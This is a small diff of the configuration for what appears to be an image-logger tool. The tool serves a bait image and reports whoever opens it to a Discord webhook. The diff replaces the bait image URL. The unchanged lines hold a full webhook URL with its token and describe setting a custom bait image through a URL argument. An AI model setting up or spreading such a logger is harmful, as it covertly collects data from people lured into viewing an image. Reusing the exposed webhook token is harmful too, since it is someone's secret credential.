@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2",
-    "image": "https://th.bing.com/th/id/R.58be7578dc0dc561479c12ec66ad80ae?rik=HWl%2fECq64d7Lhw&riu=http%3a%2f%2fstatic.demilked.com%2fwp-content%2fuploads%2f2020%2f06%2f5ef4504f57839-low-quality-photo-face-depixelizer-19-5ef1f2136629d__700.jpg&ehk=DkGfTxUBIl5HjOo8kryfy%2bOjsBqg9%2bNfh9SgZ8Wb0fM%3d&risl=&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
+    "image": "https://webusupload.apowersoft.info/picwishcom/wp-content/uploads/2022/04/featured-image-low-quality-image.jpg.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
